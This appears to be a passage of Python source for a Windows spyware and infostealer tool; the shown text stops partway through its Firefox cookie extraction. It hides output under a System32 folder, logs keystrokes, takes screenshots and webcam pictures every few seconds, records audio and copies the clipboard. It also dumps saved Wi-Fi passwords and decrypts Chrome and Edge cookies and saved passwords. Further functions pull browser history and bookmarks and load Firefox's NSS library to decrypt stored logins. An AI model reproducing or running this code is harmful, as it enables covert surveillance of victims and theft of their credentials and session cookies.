import os
import json
import logging
import threading
from pynput.keyboard import Listener
from PIL import ImageGrab
import cv2
from multiprocessing import Process, freeze_support
import time
import sounddevice as sd
import pyperclip
import subprocess
import sqlite3
import shutil
import base64
from email.mime import audio
from scipy.io.wavfile import write as wav_write
from datetime import datetime, timedelta, timezone
import win32crypt
from Crypto.Cipher import AES, DES3  
import ctypes as ct
from base64 import b64decode
import csv
from configparser import ConfigParser
import zipfile
import requests
import argparse
import platform

# Define the root path
files_directory = 'C:/Windows/System32/Files'
# Define Live-Monitoring information paths
screenshots_directory = os.path.join(files_directory, 'Screenshots')
keylog_file= os.path.join(files_directory, 'keylog.txt')
pictures_directory = os.path.join(files_directory, 'Pictures')
audio_directory = os.path.join(files_directory, 'Audio')
clipboard_directory = os.path.join(files_directory, 'Clipboard')
# Define the system info paths
system_info_file= os.path.join(files_directory, 'system_info.txt')
network_directory = os.path.join(files_directory, 'Network')
network_info_file = os.path.join(network_directory, 'network_info.txt')
wifi_info_file = os.path.join(network_directory, 'wi-fi_info.txt')
# Define the browsers info paths
browsers_directory = os.path.join(files_directory, 'Browsers')
chrome_cookies_file = os.path.join(browsers_directory, 'Chrome_cookies.txt')
chrome_history_file = os.path.join(browsers_directory, 'Chrome_history.txt')
chrome_bookmarks_file = os.path.join(browsers_directory, 'Chrome_bookmarks.txt')
chrome_passwords_file = os.path.join(browsers_directory, 'Chrome_passwords.txt')
edge_bookmarks_file = os.path.join(browsers_directory, 'Edge_bookmarks.txt')
edge_cookies_file = os.path.join(browsers_directory, 'Edge_cookies.txt')
edge_history_file = os.path.join(browsers_directory, 'Edge_history.txt')
edge_passwords_file = os.path.join(browsers_directory, 'Edge_passwords.txt')
firefox_bookmarks_file = os.path.join(browsers_directory, 'Firefox_bookmarks.txt')
firefox_cookies_file = os.path.join(browsers_directory, 'Firefox_cookies.txt')
firefox_history_file = os.path.join(browsers_directory, 'Firefox_history.txt')
firefox_passwords_file = os.path.join(browsers_directory, 'Firefox_passwords.txt')

# Create the directories if they don't exist
os.makedirs(files_directory, exist_ok=True)
os.makedirs(screenshots_directory, exist_ok=True)
os.makedirs(pictures_directory, exist_ok=True)
os.makedirs(audio_directory, exist_ok=True)
os.makedirs(clipboard_directory, exist_ok=True)
os.makedirs(network_directory, exist_ok=True)
os.makedirs(browsers_directory, exist_ok=True)

# Set up a specific logger and setup for the keylogger 
keylogger_logger = logging.getLogger('keylogger')
keylogger_logger.setLevel(logging.INFO)
keylog_handler = logging.FileHandler(keylog_file)
keylog_formatter = logging.Formatter('%(asctime)s: %(message)s')
keylog_handler.setFormatter(keylog_formatter)
keylogger_logger.addHandler(keylog_handler)
# To avoid keylogger to get into main log
keylogger_logger.propagate = False

def on_press(key): 
    keylogger_logger.info(f"Key pressed: {key}")

# Set up the general logging
logging.basicConfig(filename='app.log', level=logging.INFO, format='%(asctime)s: %(message)s')

#LIVE-MONITORING FUNCTIONS#
# Function to start keylogger
def run_keylogger():
    logging.info(f"Keylogger process started.")
    # Start a listener that monitors key presses until it's stopped
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to take screenshots
def take_screenshot(output_directory):    
    logging.info("Screenshot process started.")
    # Run an infinite loop to continuously take screenshots
    while True:
        try:
            screenshot = ImageGrab.grab() # Captures the current screen
            timestamp = time.strftime("%Y%m%d-%H%M%S") # Generates a timestamp for the filename
            screenshot_path = os.path.join(screenshots_directory, f'screenshot_{timestamp}.png') # Creates the full path for the screenshots
            screenshot.save(screenshot_path)
        except Exception as e:
            logging.info("An error occurred while taking screenshots", str(e))
        
        time.sleep(5) # Wait for 5 seconds before taking the next screenshot

# Function to take pictures
def take_pictures(output_directory):
    logging.info(f"Pictures process started.")
    try:
        # Initialize the webcam
        cam = cv2.VideoCapture(0)
         # Run an infinite loop to continuously take pictures
        while True:
            # Read a frame from the webcam, if captured succesfully..
            ret, frame = cam.read()            
            if ret:
                timestamp = time.strftime("%Y%m%d-%H%M%S") # Generates a timestamp for the filename
                picture_path = os.path.join(pictures_directory, f'picture_{timestamp}.jpg') # Creates the full path for the pictures
                cv2.imwrite(picture_path, frame)
            time.sleep(5)  # Wait for 5 seconds before taking the next picture
    except Exception as e:
        logging.info("An error occurred while taking pictures:", str(e))
    finally:
        # Release the webcam and close any open windows
        cam.release()
        cv2.destroyAllWindows()

# Function to record audio
def record_audio(output_directory):
    logging.info("Audio process started.")

    # Set the sample rate for the recording
    fs = 44100  # Sample rate per second
    duration = 15  # Recording duration in seconds
    try:
        # Run an infinite loop to continuously record audio
        while True:
            timestamp = time.strftime("%Y%m%d-%H%M%S") # Generates a timestamp for the filename
            audio_file_path = os.path.join(audio_directory, f'audio_{timestamp}.wav') # Creates the full path for the audio 
            # Start recording and wait until is finished
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait() 
            wav_write(audio_file_path, fs, recording)
            time.sleep(5)  # Wait for 5 seconds before starting the next recording
    except Exception as e:
        logging.error(f"An error occurred while recording audio: {e}", exc_info=True)

# Function to extract clipboard
def capture_clipboard(output_directory):
    logging.info("Clipboard process started.")
    
    try:
        # Continuously monitor and log the clipboard content
        while True:
            # Get the current content of the clipboard
            clipboard_data = pyperclip.paste()
            # If there is data in the clipboard..
            if clipboard_data:
                timestamp = time.strftime("%Y%m%d-%H%M%S") # Generates a timestamp for the filename
                clipboard_file_path = os.path.join(clipboard_directory, f'Clipboard_{timestamp}.txt') # Creates the full path for the clipboard file
                with open(clipboard_file_path, 'w') as clipboard_file:
                    clipboard_file.write(f"{clipboard_data}\n")
    except Exception as e:
        logging.error("An error occurred while capturing clipboard data: " + str(e))

#SYSTEM INFORMATION FUNCTIONS#
# Function to collect system information
def collect_system_info(output_file):
    logging.info("System info process started.")
    try:
        # Open the system info output file in write mode
        with open(system_info_file, 'w') as sys_info_file:
            # Execute the 'systeminfo' command and write its output to the file
            subprocess.run(['systeminfo'], stdout=sys_info_file, stderr=subprocess.PIPE, text=True)
        logging.info("System information gathered successfully.")
    except Exception as e:
        logging.error(f"An error occurred while gathering system information: {str(e)}")

# Function to collect network information
def collect_network_info(output_file):
    logging.info("Starting network data collection process.")
    try:
        # Open the network info output file in write mode
        with open(network_info_file, 'w') as file:
            # Run several network-related commands and write their output to the file
            subprocess.run(['ipconfig', '/all'], stdout=file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['arp', '-a'], stdout=file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['getmac', '/V'], stdout=file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['route', 'print'], stdout=file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['netstat', '-ano'], stdout=file, stderr=subprocess.PIPE, text=True)
            logging.info("Network information gathered successfully.")
    except Exception as e:
        logging.error(f"An error occurred while gathering network information: {str(e)}")

# Function to collect wi-fi information
def collect_wifi_info(output_file):
    logging.info("Wi-Fi process started.")
    try:
        # Execute a command to get current network interfaces information
        current_network_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], shell=True).decode('utf-8', errors='ignore')
        # Filter out the current SSID from the command output
        current_ssid_line = [line for line in current_network_info.split('\n') if "SSID" in line and "BSSID" not in line]
        
        # Check if an SSID was found
        if current_ssid_line:
            current_ssid = current_ssid_line[0].split(":")[1].strip()            
        else:
            raise Exception("No connected Wi-Fi network found.")
        # Execute a command to get password information for the current SSID
        password_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{current_ssid}"', 'key=clear'], shell=True).decode('utf-8', errors='ignore')

        # Write the Wi-Fi information to the specified output file
        with open(wifi_info_file, 'w') as file:
            file.write(f"Current Network SSID: {current_ssid}\nPassword Info:\n{password_info}")
        logging.info("Wi-Fi information gathered successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error while fetching Wi-Fi information: {str(e)}")
    except Exception as e:
        logging.error(f"An error occurred while gathering Wi-Fi information: {str(e)}")

#BROWSERS FUNCTIONS#
        
##CHROME##
# Function to convert Chrome datetime format to a readable datetime
def get_chrome_datetime(chrome_date):
    # Check if the date is valid and not the Chrome's default empty date
    if chrome_date and chrome_date != 86400000000:
        try:
            # Convert Chrome's timestamp (microseconds since 1601) to a readable datetime            
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
        except Exception as error:
            logging.error(f"Failed to convert Chrome date {chrome_date}: {error}")
            return chrome_date
    else:
        return None        

# Function to get Chrome encryption key
def get_chrome_encryption_key():
    logging.info("Starting Chrome encryption key retrieval process.")
    # Define the path to Chrome's 'Local State' file where the encryption key is stored    
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    try:
        # Open and read the 'Local State' file
        with open(local_state_path, "r", encoding="UTF-8") as file:
            local_state_data = json.load(file)

        # Decode the encrypted key from the file
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        # Use the Windows API to decrypt the key
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return decrypted_key
    except Exception as error:
        logging.error(f"Failed to retrieve Chrome encryption key: {error}")
        return None

# Function to decrypt Chrome encrypted data (passwords, cookies)      
def chrome_decryption(encrypted_content, secret_key):
    logging.info("Initiating decryption process for Chrome data.")
    try:
        # Extract the initialization vector from the encrypted content        
        initialization_vector = encrypted_content[3:15]
        # Isolate the actual encrypted data
        encrypted_data = encrypted_content[15:]
        # Setup an AES decryption cipher using the secret key and initialization vector
        decryption_cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)
        # Decrypt the data and decode it from bytes to a string
        decrypted_data = decryption_cipher.decrypt(encrypted_data)[:-16].decode('utf-8')
        return decrypted_data
    except Exception as decryption_error:
        logging.error(f"Decryption failed: {decryption_error}")
        try: 
            # Attempt a fallback decryption using win32crypt           
            return str(win32crypt.CryptUnprotectData(encrypted_content, None, None, None, 0)[1])
        except Exception as fallback_error:
            logging.error(f"Fallback decryption failed: {fallback_error}")
            return ""

# Function to extract Chrome cookies
def extract_chrome_cookies(output_file):
    logging.info("Starting Chrome cookies extraction process.")
    try:
         # Define the path to Chrome's cookies database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "Network", "Cookies")
        # Create a temporary path for the database to avoid locking issues
        temp_db_path = "temp_history.db"  
        # Copy the database file to a temporary location
        shutil.copyfile(db_path, temp_db_path)     
        # Connect to the copied database 
        db = sqlite3.connect(db_path)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        # Execute the SQL query to fetch cookies
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc,
        expires_utc, encrypted_value
        FROM Cookies""")

        # Retrieve the encryption key
        key = get_chrome_encryption_key()
        if key:
            # Open the output file to write the cookies information
            with open(chrome_cookies_file, "w", encoding="utf-8") as chrome_cookies_data:
                # Iterate through each cookie in the database
                for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                    # Decrypt the cookie value if it's encrypted
                    if not value:
                        decrypted_value = chrome_decryption(encrypted_value, key)
                    else:
                        decrypted_value = value
                        # Write cookie details, including decrypted values, to the output file
                    chrome_cookies_data.write(f"Host: {host_key}\n")
                    chrome_cookies_data.write(f"Cookie Name: {name}\n")
                    chrome_cookies_data.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                    chrome_cookies_data.write(f"Creation Date: {get_chrome_datetime(creation_utc)}\n")
                    chrome_cookies_data.write(f"Last Accessed: {get_chrome_datetime(last_access_utc)}\n")
                    chrome_cookies_data.write(f"Expiration Date: {get_chrome_datetime(expires_utc)}\n")
                    chrome_cookies_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Chrome cookies extraction completed.")
    # Exception handling blocks
    except FileNotFoundError as e:
        logging.error(f"File not found error: {e}")
    except Exception as e:
        logging.error(f"Error extracting Chrome cookies: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Chrome history
def extract_chrome_history(output_file):
    logging.info("Chrome history extraction process started.")
    try:
        # Define the path to Chrome's history database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "History")
        # Create a temporary copy of the database to avoid locking issues
        temp_db_path = os.path.join(files_directory, "temp_chrome_history.db")  
        shutil.copyfile(db_path, temp_db_path) 
        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)  
        cursor = db.cursor()

        # SQL query to fetch browsing history from the database
        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        # Open the output file to write browsing history data
        with open(chrome_history_file, "w", encoding="utf-8") as chrome_history_data:
            # Iterate over each history record in the database
            for row in cursor.fetchall():
                # Write history details to the output file
                last_visited, title, url = row
                chrome_history_data.write(f"URL: {url}\n")
                chrome_history_data.write(f"Title: {title}\n")
                chrome_history_data.write(f"Last Visit: {last_visited}\n")
                chrome_history_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Chrome history extraction completed successfully.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Chrome history extraction: {e}")
    except Exception as e:
        logging.error(f"An error occurred during Chrome history extraction: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Chrome bookmarks
def extract_chrome_bookmarks(output_file):
    logging.info("Chrome bookmarks process started.")
    # Define the path to Chrome's bookmarks file
    chrome_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    bookmarks_path = os.path.join(chrome_data_path, 'Bookmarks')

    # Check if the bookmarks file exists, log error and return if not found
    if not os.path.exists(bookmarks_path):
        logging.error(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        # Open and read the bookmarks file
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        # Open the output file for writing bookmark data
        with open(chrome_bookmarks_file, 'w', encoding='utf-8') as chrome_bookmarks_data:
            # Function to traverse through the bookmark nodes
            def traverse_bookmarks(node):
                # Write bookmark details if the node is a URL
                if 'type' in node and node['type'] == 'url':
                    chrome_bookmarks_data.write(f"Title: {node.get('name', 'N/A')}\n")
                    chrome_bookmarks_data.write(f"URL: {node.get('url', 'N/A')}\n")
                    chrome_bookmarks_data.write("=" * 50 + "\n\n")
                # Recursively process children nodes if present
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            # Process each root node in the bookmarks data
            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])
        logging.info("Chrome bookmarks extraction completed.")

    except Exception as e:
        logging.error(f"Error extracting Chrome bookmarks: {str(e)}")

# Function to extract Chrome passwords
def extract_chrome_passwords(output_file):
    logging.info("Chrome passwords extraction process started.")
    
    try:
        # Retrieve the Chrome encryption key
        key = get_chrome_encryption_key()
        # Define the path to Chrome's 'Login Data' database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        # Create a temporary path and copy the database to process it
        temp_db_path = "TempChromeData.db"
        shutil.copyfile(db_path, temp_db_path)
        # Connect to the copied database
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # Execute SQL query to select saved login data
        query = "SELECT origin_url, username_value, password_value FROM logins"
        cursor.execute(query)

        # Open the output file for writing passwords data
        with open(chrome_passwords_file, "w", encoding="utf-8") as chrome_passwords_data:
            # Iterate over each login record in the database
            for row in cursor.fetchall():
                origin_url, username, encrypted_password = row
                # Decrypt the password using the previously retrieved key
                decrypted_password = chrome_decryption(encrypted_password, key) if encrypted_password else ''
                # Write the login data to the output file
                if username or decrypted_password:
                    chrome_passwords_data.write(f"Origin URL: {origin_url}\n")
                    chrome_passwords_data.write(f"Username: {username}\n")
                    chrome_passwords_data.write(f"Password: {decrypted_password}\n")
                    chrome_passwords_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Chrome passwords extraction completed.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Chrome passwords extraction: {e}")
    except Exception as e:
        logging.error(f"Error extracting Chrome passwords: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

##EDGE##
# Function to convert Edge datetime format to a readable datetime
def get_edge_datetime(edge_date):
    # Convert Edge's timestamp (microseconds since January 1, 1601) to a readable datetime
    return datetime(1601, 1, 1) + timedelta(microseconds=edge_date)

# Function to get Edge encryption key
def get_edge_encryption_key():
    logging.info("Edge encryption key retrieval process started.")
    try:
        # Define the path to to Edge's 'Local State' file where the encryption key is stored     
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Local State")
        # Read the 'Local State' file to extract the encrypted key
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        # Decode the base64 encoded encrypted key, skip the first 5 bytes (DPAPI)        
        key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
        key = key[5:]
        # Decrypt the key using Windows API CryptUnprotectData
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        logging.info("Edge encryption key retrieved successfully.")
        return decrypted_key
    except Exception as e:
        logging.error(f"Failed to retrieve Edge encryption key: {e}")
        return None

# Function to decrypt Edge encrypted data (passwords, cookies) using the secret key
def edge_decryption(encrypted_password, key):
    logging.info("Edge password decryption process started.")
    try:
        # Extract initialization vector and encrypted data from the content        
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Extract initialization vector and encrypted data from the content        
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        logging.info("Edge password decrypted successfully.")
        return decrypted_password
    except Exception as e:
        # Extract initialization vector and encrypted data from the content        
        try:
            decrypted_password = str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
            logging.info("Edge password decrypted using fallback method.")
            return decrypted_password
        except Exception as e:
            logging.error(f"Error decrypting Edge password: {e}")
            return ""

# Function to extract Edge cookies
def extract_edge_cookies(output_file):
    logging.info("Edge cookies extraction process started.")
    db = None
    
    try:
        # Define the path to Edge's cookies database
        original_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Default",
                                        "Network", "Cookies")
        # Check if the cookies database file exis
        if not os.path.isfile(original_db_path):
            raise FileNotFoundError(f"Edge cookies database not found at {original_db_path}")
        
        # Create a temporary copy of the database to avoid locking issues        
        temp_db_path = "temp_edge_cookies.db"
        shutil.copyfile(original_db_path, temp_db_path)

        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # SQL query to fetch cookies from the database
        query = "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM Cookies"
        cursor.execute(query)

        # Retrieve Edge's encryption key for decrypting cookies
        key = get_edge_encryption_key()

        # Open the output file to write decrypted cookies information
        with open(edge_cookies_file, "w", encoding="utf-8") as edge_cookies_data:
            # Iterate over each cookie record in the database
            for row in cursor.fetchall():
                host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value = row
                # Decrypt the cookie value if it's encrypted, otherwise use the value directly                
                decrypted_value = value if value else edge_decryption(encrypted_value, key)
                # Write cookie details to the output file                
                edge_cookies_data.write(f"Host: {host_key}\n")
                edge_cookies_data.write(f"Cookie Name: {name}\n")
                edge_cookies_data.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                edge_cookies_data.write(f"Creation Date: {get_edge_datetime(creation_utc)}\n")
                edge_cookies_data.write(f"Last Accessed: {get_edge_datetime(last_access_utc)}\n")
                edge_cookies_data.write(f"Expiration Date: {get_edge_datetime(expires_utc)}\n")
                edge_cookies_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Edge cookies extraction completed.")
    # Exception handling blocks
    except FileNotFoundError as e:
        logging.error(f"File not found error: {e}")
    except Exception as e:
        logging.error(f"Error extracting Edge cookies: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Edge history
def extract_edge_history(output_file):
    logging.info("Edge history extraction process started.")

    try:
        # Define the path to Edge's history database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "History")
        # Create a temporary copy of the database to avoid locking issues
        temp_db_path = "temp_edge_history.db" 
        shutil.copyfile(db_path, temp_db_path)
        # Connect to the temporary database copy  
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # SQL query to fetch browsing history from the database
        query = """
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls"""
        cursor.execute(query)

        # Open the output file to write browsing history data
        with open(edge_history_file, "w", encoding="utf-8") as edge_history_data:
            # Iterate over each history record in the database
            for row in cursor.fetchall():
                # Write history details to the output file
                last_visited, title, url = row
                edge_history_data.write(f"URL: {url}\n")
                edge_history_data.write(f"Title: {title}\n")
                edge_history_data.write(f"Last Visit: {last_visited}\n")
                edge_history_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Edge history extraction completed successfully.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Edge history extraction: {e}")
    except Exception as e:
        logging.error(f"An error occurred during Edge history extraction: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Edge bookmarks
def extract_edge_bookmarks(output_file):
    logging.info("Edge bookmarks extraction process started.")
    # Define the path to the Edge bookmarks file
    edge_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    bookmarks_path = os.path.join(edge_data_path, 'Bookmarks')

    # Check if the bookmarks file exists, log error and return if not found
    if not os.path.exists(bookmarks_path):
        logging.error(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        # Open and read the bookmarks file
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        # Open the output file to write bookmark data
        with open(edge_bookmarks_file, 'w', encoding='utf-8') as edge_bookmarks_data:
            # Recursive function to process bookmark nodes
            def process_bookmarks(node):
                # Write bookmark details if the node is a URL
                if 'type' in node and node['type'] == 'url':
                    edge_bookmarks_data.write(f"Title: {node.get('name', 'N/A')}\n")
                    edge_bookmarks_data.write(f"URL: {node.get('url', 'N/A')}\n")
                    edge_bookmarks_data.write("=" * 50 + "\n\n")
                # Recursively process children nodes if present
                elif 'children' in node:
                    for child in node['children']:
                        process_bookmarks(child)

            # Process each root node in the bookmarks data
            for root_node in bookmarks_data['roots']:
                process_bookmarks(bookmarks_data['roots'][root_node])
        logging.info("Edge bookmarks extracted successfully.")

    except Exception as e:
        logging.error(f"Error extracting Edge bookmarks: {str(e)}")

# Function to extract Edge passwords
def extract_edge_passwords(output_file):
    logging.info("Edge passwords extraction process started.")
    
    try:
        # Retrieve the Edge encryption key
        key = get_edge_encryption_key()
        # Define the path to the Edge 'Login Data' database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "Login Data")
        # Create a temporary copy of the database to avoid locking issues
        temp_db_path = "temp_edge_passwords.db"
        shutil.copyfile(db_path, temp_db_path)
        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # Execute SQL query to select saved login data
        query = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created"
        cursor.execute(query)

        # Open the output file for writing passwords data
        with open(edge_passwords_file, "w", encoding="utf-8") as edge_passwords_data:
            # Iterate over each login record in the database
            for row in cursor.fetchall():
                origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
                # Decrypt the password using the previously retrieved key
                decrypted_password = edge_decryption(encrypted_password, key)
                # Write the login data to the output file
                if username or decrypted_password:
                    edge_passwords_data.write(f"Origin URL: {origin_url}\n")
                    edge_passwords_data.write(f"Username: {username}\n")
                    edge_passwords_data.write(f"Password: {decrypted_password}\n")
                    edge_passwords_data.write(f"=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Edge passwords extraction completed.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Edge passwords extraction: {e}")
    except Exception as e:
        logging.error(f"Error extracting Edge passwords: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

##FIREFOX##
# Function convert Firefox's timestamp to a readable datetime
def get_firefox_datetime(firefox_date):
     # Convert Firefox's timestamp (microseconds since January 1, 1970) to a readable datetime
    return datetime(1970, 1, 1) + timedelta(microseconds=firefox_date)

# Path to the Firefox profiles director
FIREFOX_PATH = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")

# Function to identify and list the paths of Firefox profiles
def identify_firefox_profiles(profiles_directory=FIREFOX_PATH):
    logging.info("Identifying Firefox profiles.")
    # Path to the 'profiles.ini' file, which contains information about user profiles
    profiles_ini_path = os.path.join(profiles_directory, "profiles.ini")
    # Raise an exception if 'profiles.ini' does not exist
    if not os.path.isfile(profiles_ini_path):
        raise Exception(f'profiles.ini not found in path {profiles_directory}.')

    # Use ConfigParser to parse 'profiles.ini'
    profiles_config = ConfigParser()
    profiles_config.read(profiles_ini_path, encoding='utf-8')
    profile_paths = []
    # Iterate through each section in the 'profiles.ini' file to find profile paths
    for section in profiles_config.sections():
        if section.startswith("Profile"):
            # Construct the full path to the 'logins.json' file for each profile
            profile_path = os.path.join(profiles_directory, profiles_config.get(section, "Path"))
            profile_paths.append(os.path.join(profile_path, 'logins.json'))

    return profile_paths

# Function to load the Firefox NSS (Network Security Services) libraries
def get_firefox_nss():
    logging.info("Loading Firefox NSS.")
    nss_name = 'nss3.dll' # Name of the NSS library file
    # Paths to potentially locate the NSS library
    mozilla_firefox_path = os.path.join(os.environ["APPDATA"], "Local", "Mozilla Firefox")
    program_files_path = "C:\\Program Files"
    program_files_x86_path = "C:\\Program Files (x86)"

    # List of locations where 'nss3.dll' may be found
    locations = [
        "",  
        mozilla_firefox_path,
        os.path.join(program_files_path, "Mozilla Firefox"),
        os.path.join(program_files_x86_path, "Mozilla Firefox"),
    ]

    # Attempt to load the NSS library from the various locations
    for location in locations:
        nss_path = os.path.join(location, nss_name)
        try:
            nss_lib = ct.CDLL(nss_path)
            return nss_lib # Return the loaded library
        except OSError:
            # Continue to the next path if the library is not found
            continue

    raise FileNotFoundError("Failed to find or load 'nss3.dll'.")

# Definition of the SECItem structure used by NSS functions
class SECItem(ct.Structure):
    _fields_ = [
        ("type", ct.c_int),
        ("data", ct.c_char_p),
        ("len", ct.c_int),
    ]
    # Method to decode data from the SECItem structure
    def decode_data(self):
        _bytes = ct.string_at(self.data, self.len)
        return _bytes.decode('utf-8')

# Function to decrypt data (like passwords) stored in Firefox profiles
def firefox_decrypt(profile: str, data, nss):
    logging.info("Firefox decryption process started.")
    # Declare the NSS function types for reading and decrypting data
    PK11_ReadRawAttribute = nss.PK11_ReadRawAttribute
    PK11_ReadRawAttribute.argtypes = [ct.c_char_p, ct.c_char_p, ct.POINTER(SECItem)]
    PK11_ReadRawAttribute.restype = ct.c_int

    PK11SDR_Decrypt = nss.PK11SDR_Decrypt
    PK11SDR_Decrypt.argtypes = [ct.POINTER(SECItem), ct.POINTER(SECItem), ct.c_void_p]
    PK11SDR_Decrypt.restype = ct.c_int

    # Initialize the NSS library for the specific Firefox profile
    profile_path = b"sql:" + bytes(profile.strip('logins.json'), 'utf-8')
    if nss.NSS_Init(profile_path) != 0:
        raise Exception("NSS Library initialization failed for profile: " + profile)

    # Base64 decode the encrypted data
    data = b64decode(data)
    # Set up SECItem structures for input and output
    inp = SECItem(0, data, len(data))
    out = SECItem(0, None, 0)
    # Decrypt the data using the NSS library
    if PK11SDR_Decrypt(inp, out, None) == 0:
        decrypted_data = out.decode_data()
        logging.info(f"Data decrypted successfully for profile: {profile}")
        return decrypted_data
    else:
        logging.error(f"Failed to decrypt data for profile: {profile}.")
        return 'Cannot be decrypted'                

# Function to extract Firefox cookies
def extract_firefox_cookies(output_file): 
    logging.info("Firefox cookies extraction process started.")
    # Define the path to Firefox profiles
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")

    # Identify the path of the cookies database in the default profile
    cookies_db_path = None
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            cookies_db_path = os.path.join(firefox_profile_path, profile, "cookies.sqlite")
            break

    # Check if the cookies database file exists
    if not os.path.isfile(cookies_db_path):
        logging.error("Firefox cookies database does not exist.")
        return

    # Create a temporary copy of the database to avoid locking issues
    temp_db_path = os.path.join(firefox_profile_path, "temp_FirefoxCookies.db")
    shutil.copyfile(cookies_db_path, temp_db_path)

    try:
        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # Execute SQL query to select saved login data
        query = "SELECT name, value, host, path, expiry FROM moz_cookies"
        cursor.execute(query)

